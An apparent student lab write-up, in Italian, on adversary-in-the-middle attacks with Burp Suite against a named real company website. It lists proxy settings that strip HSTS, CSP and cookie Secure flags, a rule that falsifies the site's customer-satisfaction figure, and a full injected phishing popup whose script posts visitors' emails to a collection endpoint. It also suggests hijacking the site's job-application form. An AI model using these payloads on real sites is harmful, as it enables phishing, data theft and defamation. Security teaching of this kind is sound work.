# LAB 06_AitM

---
## Case A: beavestudio.com (does not use Strict Transport Security)
Per questo primo esperimento ho analizzato il sito web aziendale dei miei amici delle superiori.
Prima di tutto, ho analizzato il dominio con il comando curl:
INPUT: `curl -I http://beavestudio.com`
OUTPUT:
```bash
HTTP/1.1 301 Moved Permanently
Connection: Keep-Alive
Keep-Alive: timeout=5, max=100
Date: Sun, 18 Jan 2026 10:17:34 GMT
Server: LiteSpeed
Location: https://beavestudio.com/
platform: hostinger
panel: hpanel
Content-Security-Policy: upgrade-insecure-requests
```
Ho ripetutto l'analisi anche con HTTPS:
INPUT: `curl -I https://beavestudio.com`
OUTPUT:
```bash
HTTP/2 200 
x-powered-by: PHP/8.2.29
content-type: text/html; charset=UTF-8
link: <https://beavestudio.com/wp-json/>; rel="https://api.w.org/"
link: <https://beavestudio.com/wp-json/wp/v2/pages/4504>; rel="alternate"; title="JSON"; type="application/json"
link: <https://beavestudio.com/>; rel=shortlink
date: Sun, 18 Jan 2026 10:16:50 GMT
server: LiteSpeed
platform: hostinger
panel: hpanel
retry-after: 60
content-security-policy: upgrade-insecure-requests
alt-svc: h3=":443"; ma=2592000, h3-29=":443"; ma=2592000, h3-Q050=":443"; ma=2592000, h3-Q046=":443"; ma=2592000, h3-Q043=":443"; ma=2592000, quic=":443"; ma=2592000; v="43,46"
```
Come possiamo vedere, il sito web supporta HTTPS ma non supporta HSTS

----
##### Predisposizione di BURP Suite
Prima di tutto, come impostare correttamente il software BURP suite:
Force the use of TLS on the proxy listener by modifying the listener interface
Enable Remove Secure flag from cookies
Enable Convert HTTPS links to HTTP
Add a Match and Replace rule to remove the Strict-Transport-Security response header
Add a Match and Replace rule to remove the Content-Security-Policy response header

#### Modify selected portions of responses
L'obiettivo didattico è cercare di sminuire l'azienda e farle perdere di valore.
Vado quindi a modificare la percentuale di clienti soddisfatti con una semplice regola che cambia 100% con 13%.
<img src="./img_1/100_13.png" alt="DOM XSS advanced payload" style="width:50%; height:auto;">
<img src="./img_1/13.png" alt="DOM XSS advanced payload" style="width:80%; height:auto;">

#### Injection and exfiltration
Voglio iniettare codice nella pagina, in particolare creo un pop up che compare quando un utente apre la pagina. Il popup non va a modificare la pagina in se ma aggiunge qualcosa, oscura quello che c'è sotto e cattura l'attenzione. Se l'utente abbocca, inserire la mail e quindi posso raccogliere indirizzi di posta elettronica gratuitamente.
La mia regola HTTP march and replace
match: `</body>`
replace: 
```html
<style> #promo-overlay { position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); display:flex; justify-content:center; align-items:center; z-index:9999; } #promo-popup { background:#fff; padding:30px 20px; border-radius:10px; max-width:400px; width:90%; text-align:center; font-family:Arial,sans-serif; box-shadow:0 4px 15px rgba(0,0,0,0.3); position:relative; } #promo-popup .close-btn { position:absolute; top:10px; right:15px; font-size:18px; cursor:pointer; } #promo-popup input[type="email"] { width:80%; padding:10px; margin:15px 0; border:1px solid #ccc; border-radius:5px; } #promo-popup button { padding:10px 20px; background:#ff5722; color:#fff; border:none; border-radius:5px; cursor:pointer; } #promo-popup button:hover { background:#e64a19; } </style> <div id="promo-overlay">     <div id="promo-popup">         <span class="close-btn">&times;</span>         <h2>Sei il cliente numero 10.000!</h2>         <p>Inserisci la tua email per ricevere la promozione imperdibile:</p>         <input type="email" id="promo-email" placeholder="La tua email"><br>         <button id="promo-submit">Ricevi l'offerta</button>     </div> </div> <script>
document.getElementById('promo-submit').addEventListener('click', () => {
    const email = document.getElementById('promo-email').value.trim();
    if (email === '') {
        alert('Inserisci un indirizzo email valido');
        return;
    }
    // Example of sending data to a test server endpoint
    fetch('http://localhost:8080/collect', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            email: email,
            source: 'promo-popup',
            timestamp: new Date().toISOString()
        })
    })
    .then(() => {
        alert('Grazie! La tua email è stata inviata.');
        document.getElementById('promo-overlay').style.display = 'none';
    })
    .catch(() => {
        alert('Errore durante l’invio dei dati.');
    });
});
</script> </body>
```
Risultato:
<img src="./img_1/popup.png" alt="DOM XSS advanced payload" style="width:60%; height:auto;">
Il sito web è italiano quindi il popup è in lingua italiana.
Natualmente questa è solo una dimostrazione. Un modo per catturare ancora più informazioni sensibili e senza alcun sospetto da parte dell'utente è quello di modificare il destinarario dei dati provenienti dal form "lavora con noi"

---
## Case B: (uss Strict Transport Security)